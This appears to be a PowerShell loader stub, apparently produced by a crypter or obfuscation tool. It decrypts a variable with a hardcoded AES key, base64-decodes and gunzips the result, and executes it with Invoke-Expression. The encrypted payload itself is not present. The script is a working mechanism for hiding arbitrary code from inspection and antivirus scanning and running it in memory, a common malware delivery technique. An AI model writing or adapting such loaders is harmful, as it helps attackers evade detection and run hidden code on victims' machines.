function dezip($bytes) {
    $streamIn = New-Object System.IO.MemoryStream(,$bytes);
    $streamOut = New-Object System.IO.MemoryStream;
    $gzipStream = New-Object System.IO.Compression.GzipStream $streamIn, ([IO.Compression.CompressionMode]::Decompress);
    $gzipStream.CopyTo($streamOut);
    $gzipStream.Close();
    return $streamOut.ToArray();
}

function run($encrypt){
    $zipped = [system.Convert]::FromBase64String($encrypt);
    $unzipped = dezip($zipped);
    $command = [System.Text.Encoding]::ASCII.GetString($unzipped);
    iex($command);
}

Function Set-SecretKey {
    [CmdletBinding()]
    Param
    (
        [string]$Key
    )
    $Length = $Key.Length;
    $Pad = 32-$Length;
    If(($Length -lt 16) -or ($Length -gt 32))
    {
        Throw "String must be between 16 and 32 characters";
    }
    $Encoding = New-Object System.Text.ASCIIEncoding;
    $Bytes = $Encoding.GetBytes($Key + "0" * $Pad);
    Return $Bytes;
}
 
Function Get-EncryptedData {
    [CmdletBinding()]
    Param
    (
        $Key,
        $TextInput
    ) 
    $Result = $TextInput | ConvertTo-SecureString -Key $Key | ForEach-Object {[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($_))};
    Return $Result;
}
 
$Key = Set-SecretKey -Key "YRTWHTRJUUYUYRKB";
$DecryptedData = Get-EncryptedData -Key $Key -TextInput $encrypted;
run $DecryptedData